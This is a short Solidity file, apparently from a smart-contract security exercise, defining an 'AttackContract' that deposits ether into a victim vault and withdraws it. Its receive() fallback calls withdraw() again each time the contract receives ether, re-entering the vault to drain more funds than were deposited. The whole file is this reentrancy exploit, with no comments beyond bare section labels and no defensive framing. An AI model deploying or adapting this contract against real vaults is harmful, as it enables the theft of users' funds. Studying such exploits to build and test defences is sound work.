// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

import "../IVault.sol";

contract AttackContract {
    // State variables
    address victim;

    // Constructor
    constructor(address _victim) {
        victim = _victim;
    }

    // Functions
    function deposit() external payable {
        IVault(victim).deposit{value: msg.value}();
    }

    function withdraw() external {
        IVault(victim).withdraw();
    }

    // receive
    receive() external payable {
        try IVault(victim).withdraw() {} catch {}
    }
}
